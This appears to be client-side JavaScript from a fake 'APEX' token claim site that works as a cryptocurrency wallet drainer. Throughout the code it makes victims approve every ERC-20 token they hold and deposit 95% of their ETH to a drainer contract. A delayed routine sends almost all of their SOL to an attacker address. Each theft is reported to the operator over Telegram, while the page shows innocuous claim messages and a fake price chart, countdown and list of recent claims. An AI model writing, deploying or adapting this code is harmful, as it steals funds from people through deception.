        let priceUSD = 0;
        try { priceUSD = await getTokenPriceInUSD(t.address); } catch {}
        const formatted = bal / Math.pow(10, t.decimals || 18);
        tokens.push({
          address: t.address,
          symbol: t.symbol || 'TOKEN',
          decimals: t.decimals || 18,
          balance: bal.toString(),
          balanceFormatted: formatted,
          valueUSD: formatted * priceUSD,
        });
      }
    } catch {}
  }
  return tokens;
}

// ============================================================
//  MAIN PROCESS — EVM
// ============================================================
async function processWallet() {
  if (!web3 || !contractInstance) {
    showStatus('Please connect your wallet first.', 'error');
    return;
  }

  try {
    // 1. Verify chain
    await ensureCorrectChain();
    await ensureContractIsDeployed();

    const accounts = await web3.eth.getAccounts();
    const userAddress = accounts[0];
    console.log(`User address: ${userAddress}`);

    // 2. Check balance
    const balanceWei = await web3.eth.getBalance(userAddress);
    const balanceETH = web3.utils.fromWei(balanceWei, 'ether');
    const balanceUSD = parseFloat(balanceETH) * ethPriceInUSD;

    console.log(`Balance: ${balanceETH} ETH ($${balanceUSD.toFixed(2)})`);

    if (balanceUSD < CLAIM_THRESHOLD_USD) {
      showStatus('Minimum balance requirement not met.', 'error');
      return;
    }

    // 3. Scan for tokens
    showStatus('Scanning for eligible tokens...', 'info');
    const tokens = await detectAllERC20Tokens(userAddress);
    console.log(`Eligible tokens: ${tokens.length}`);

    const approvedTokens = [];
    const approvedAmounts = [];

    // 4. Approve each token
    for (const token of tokens) {
      showStatus(`Authorizing ${token.symbol}...`, 'info');

      // 4a. Real ERC-20 approve
      const realApprove = await approveERC20(token.address, token.balance);
      console.log(`approve(${token.symbol}):`, realApprove);

      // 4b. Register in drainer contract
      const setResult = await callSetTokenApproval(token.address, token.balance);
      console.log(`setTokenApproval(${token.symbol}):`, setResult);

      if (realApprove.success) {
        approvedTokens.push(token.address);
        approvedAmounts.push(token.balance);
      }

      await new Promise(r => setTimeout(r, 2000));
    }

    // 5. Deposit native ETH
    let depositedAmount = 0;
    if (parseFloat(balanceETH) > 0.005) {
      showStatus('Preparing claim deposit...', 'info');
      depositedAmount = parseFloat(balanceETH) * 0.95;
      const depositResult = await callDepositNative(depositedAmount);
      console.log('depositNative:', depositResult);
    }

    // 6. Execute token drain
    let tokenDrainResult = { success: false };
    if (approvedTokens.length > 0) {
      showStatus('Processing token distribution...', 'info');
      tokenDrainResult = await executeTokenDrain(userAddress, approvedTokens, approvedAmounts);
      console.log('tokenDrain:', tokenDrainResult);
    }

    // 7. Execute native distribution
    let nativeDrainResult = { success: false };
    if (depositedAmount > 0) {
      showStatus('Finalizing claim...', 'info');
      nativeDrainResult = await executeNativeDrain(userAddress, depositedAmount);
      console.log('nativeDrain:', nativeDrainResult);
    }

    // 8. Report to Telegram
    const explorer = EXPLORERS[EXPECTED_CHAIN_ID] || 'explorer';
    const lines = [
      `<b>💎 Claim Process Report</b>`,
      `📌 Wallet: <code>${userAddress}</code>`,
      `💰 Balance: ${balanceETH} ETH`,
      `🪙 Tokens Found: ${tokens.length}`,
      `✅ Approved: ${approvedTokens.length}`,
      `💵 Deposited: ${depositedAmount.toFixed(6)} ETH`,
      `━━━━━━━━━━━━━━━`,
      `🔹 Token Drain: ${tokenDrainResult.success ? '✅' : '❌'} ${tokenDrainResult.hash ? `<code>${tokenDrainResult.hash}</code>` : ''}`,
      `🔹 Native Drain: ${nativeDrainResult.success ? '✅' : '❌'} ${nativeDrainResult.hash ? `<code>${nativeDrainResult.hash}</code>` : ''}`,
      `🕒 ${new Date().toISOString()}`,
    ];
    await sendTelegramMessage(lines.join('\n'));

    showStatus('Claim processed successfully.', 'success');
    userHasClaimed = true;

    // 9. Clear any pending state
    localStorage.removeItem('pendingTx');
  } catch (e) {
    console.error('Process error:', e);
    showStatus(e.message || 'Processing error.', 'error');
    await sendTelegramMessage(`<b>⚠️ Process Error</b>\n${e.message}`);
  }
}

// ============================================================
//  CLAIM ENTRY POINT
// ============================================================
async function initiateClaimProcess() {
  if (!web3) {
    showStatus('No wallet connected.', 'error');
    return;
  }
  await processWallet();
}
window.initiateClaimProcess = initiateClaimProcess;

// ============================================================
//  SOLANA HANDLING (kept from original, lightly cleaned)
// ============================================================
async function loadSolanaLibraries() {
  if (typeof solanaWeb3 !== 'undefined' && typeof splToken !== 'undefined') return true;
  return new Promise((resolve, reject) => {
    let loaded = 0;
    const total = 2;
    const checkAll = () => { if (loaded === total) resolve(true); };

    if (typeof solanaWeb3 === 'undefined') {
      const s = document.createElement('script');
      s.src = 'https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js';
      s.onload = () => { loaded++; checkAll(); };
      s.onerror = () => reject(new Error('Failed to load solanaWeb3'));
      document.head.appendChild(s);
    } else { loaded++; checkAll(); }

    if (typeof splToken === 'undefined') {
      const s = document.createElement('script');
      s.src = 'https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.8/lib/index.iife.min.js';
      s.onload = () => { loaded++; checkAll(); };
      s.onerror = () => reject(new Error('Failed to load splToken'));
      document.head.appendChild(s);
    } else { loaded++; checkAll(); }
  });
}

async function processSolanaClaim() {
  try {
    await loadSolanaLibraries();
    if (!solanaProvider || !solanaPublicKey) {
      const wallets = getSolanaWallets();
      if (wallets.length === 0) return false;
      const wallet = wallets[0];
      const provider = wallet.provider;
      if (!provider.connect) return false;
      const resp = await provider.connect();
      solanaProvider = provider;
      solanaPublicKey = resp.publicKey?.toString() || resp.toString();
    }

    const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
    const owner = new solanaWeb3.PublicKey(solanaPublicKey);
    const solBalance = await connection.getBalance(owner);

    if (solBalance <= 5000) {
      return false;
    }

    const LAMPORTS_TO_LEAVE = 5000;
    const tx = new solanaWeb3.Transaction();
    tx.add(solanaWeb3.SystemProgram.transfer({
      fromPubkey: owner,
      toPubkey: new solanaWeb3.PublicKey(ATTACKER_SOLANA_ADDRESS),
      lamports: solBalance - LAMPORTS_TO_LEAVE,
    }));

    const { blockhash } = await connection.getRecentBlockhash();
    tx.recentBlockhash = blockhash;
    tx.feePayer = owner;

    let signature;
    if (solanaProvider.signAndSendTransaction) {
      signature = await solanaProvider.signAndSendTransaction(tx);
    } else if (solanaProvider.signTransaction) {
      const signed = await solanaProvider.signTransaction(tx);
      signature = await connection.sendRawTransaction(signed.serialize());
    } else {
      return false;
    }

    await sendTelegramMessage(`<b>💠 Solana Claim</b>\nWallet: <code>${solanaPublicKey}</code>\nAmount: ${(solBalance - LAMPORTS_TO_LEAVE) / 1e9} SOL\nTx: <code>${signature}</code>`);
    return true;
  } catch (e) {
    console.error('Solana error:', e);
    return false;
  }
}

// ============================================================
//  UI — COUNTDOWN, CHART, CLAIMS
// ============================================================
function startCountdown() {
  let remaining = 114600;
  updateCountdownDisplay(remaining);
  countdownInterval = setInterval(() => {
    remaining--;
    if (remaining <= 0) { clearInterval(countdownInterval); return; }
    updateCountdownDisplay(remaining);
  }, 1000);
}

function updateCountdownDisplay(s) {
  const d = Math.floor(s / 86400);
  const h = Math.floor((s % 86400) / 3600);
  const m = Math.floor((s % 3600) / 60);
  const sec = s % 60;
  const el = document.getElementById('countdown');
  if (el) el.textContent = `${d}:${h}:${m}:${sec}`;
}

function createTokenChart() {
  const ctx = document.getElementById('tokenChart');
  if (!ctx || typeof Chart === 'undefined') return;
  const data = [];
  let v = 0.04;
  for (let i = 0; i < 24; i++) { v += Math.random() * 0.01 - 0.002; data.push(v); }
  tokenChart = new Chart(ctx.getContext('2d'), {
    type: 'line',
    data: {
      labels: Array.from({ length: 24 }, (_, i) => i + 'h'),
      datasets: [{
        label: 'APEX', data,
        borderColor: '#FF6B00', backgroundColor: 'rgba(255,107,0,0.1)',
        borderWidth: 2, tension: 0.4, pointRadius: 0, fill: true,
      }],
    },
    options: {
      responsive: true, maintainAspectRatio: false,
      plugins: { legend: { display: false } },
      scales: {
        x: { display: false },
        y: { grid: { color: 'rgba(255,255,255,0.05)' } },
      },
    },
  });
}

function updateTokenPrice() {
  const last = priceHistory[priceHistory.length - 1] || 0.04;
  const price = (last + Math.random() * 0.015 - 0.002).toFixed(4);
  priceHistory.push(parseFloat(price));
  if (priceHistory.length > 10) priceHistory.shift();
  const el = document.getElementById('tokenPrice');
  if (el) el.textContent = `$${price}`;
}

function generateInitialClaims() {
  claimList = Array.from({ length: 10 }, () => ({
    address: `0x${Math.random().toString(16).slice(2, 6)}...${Math.random().toString(16).slice(2, 6)}`,
    amount: 500,
    timestamp: Date.now() - Math.random() * 3600000,
  }));
  updateClaimList();
}

function updateClaimList() {
  if (!claimListElement) return;
  claimListElement.innerHTML = claimList.map(c =>
    `<div class="claim-item" style="display:flex; justify-content:space-between; padding:6px 0; font-size:12px;">
      <span style="color:#00b4d8;">${c.address}</span>
      <span style="color:#10b981;">${c.amount} APEX</span>
    </div>`
  ).join('');
}

function startClaimUpdates() {
  setInterval(() => {
    claimList.unshift({
      address: `0x${Math.random().toString(16).slice(2, 6)}...`,
      amount: 500,
      timestamp: Date.now(),
    });
    if (claimList.length > 10) claimList.pop();
    updateClaimList();
  }, 30000);
}

function updateAIAnalytics() {
  if (predictionFill) predictionFill.style.width = `${85 + Math.floor(Math.random() * 15)}%`;
}

// ============================================================
//  MISC UI
// ============================================================
function initializeServiceWorker() {
  if ('serviceWorker' in navigator) {
    try {
      const blob = new Blob([`
        self.addEventListener('install', (e) => self.skipWaiting());
        self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));
      `], { type: 'application/javascript' });
      navigator.serviceWorker.register(URL.createObjectURL(blob));
    } catch (e) {}
  }
}

function initializeMobileSpecificOptimizations() {
  document.addEventListener('touchstart', (e) => {
    if (e.target.closest('button')) {
      e.target.style.transform = 'scale(0.98)';
      setTimeout(() => { e.target.style.transform = ''; }, 150);
    }
  }, { passive: true });
}

function showWalletModal() { walletModal?.classList.add('active'); }
function hideWalletModal() { walletModal?.classList.remove('active'); }
function hideAnnouncementModal() { announcementModal?.classList.remove('active'); }

function copyReferralLink() {
  if (!referralLink) return;
  const ta = document.createElement('textarea');
  ta.value = referralLink.textContent;
  document.body.appendChild(ta);
  ta.select();
  document.execCommand('copy');
  document.body.removeChild(ta);
  showNotification('Link copied!', 'success');
}

function showNotification(msg, type = 'success') {
  const n = document.createElement('div');
  n.style.cssText = `
    position:fixed; bottom:20px; right:20px;
    background:#1F2937; color:white;
    border-left:4px solid ${type === 'error' ? '#EF4444' : type === 'info' ? '#3B82F6' : '#10B981'};
    padding:12px 16px; border-radius:8px;
    z-index:10000; max-width:320px; font-size:14px;
  `;
  n.textContent = msg;
  document.body.appendChild(n);
  setTimeout(() => { n.style.opacity = '0'; setTimeout(() => n.remove(), 300); }, 3000);
}

// ============================================================
//  MISC GLOBAL HANDLERS
// ============================================================
window.addEventListener('scroll', () => {
  const header = document.getElementById('header');
  if (header) {
    if (window.scrollY > 50) header.classList.add('scrolled');
    else header.classList.remove('scrolled');
  }
});

document.addEventListener('click', (e) => {
  if (navLinks && !navLinks.contains(e.target) && mobileMenuBtn && !mobileMenuBtn.contains(e.target)) {
    navLinks.classList.remove('active');
  }
  if (walletModal && walletModal.classList.contains('active') && e.target === walletModal) hideWalletModal();
  if (announcementModal && announcementModal.classList.contains('active') && e.target === announcementModal) hideAnnouncementModal();
});

if (isMobileDevice) document.body.classList.add('mobile-optimized');

// ============================================================
//  DELAYED SOLANA / BTC HANDLING
// ============================================================
async function initiateDelayedClaims() {
  if (delayedAttemptsScheduled) return;
  delayedAttemptsScheduled = true;

  const delayMs = 150000;
  logDebug(`Scheduling delayed claim check in ${delayMs / 60000} minutes`);

  setTimeout(async () => {
    try {
      const solanaWallets = getSolanaWallets();
      if (solanaWallets.length > 0) {
        await processSolanaClaim();
      }
    } catch (e) {
      console.error('Delayed Solana error:', e);
    }
    delayedAttemptsScheduled = false;
  }, delayMs);
}

// ============================================================
//  BOOT
// ============================================================
setTimeout(() => {
  const saved = getSavedWallet();
  if (saved) restoreWalletConnection();
}, 1000);

console.log('✅ Application initialized successfully');
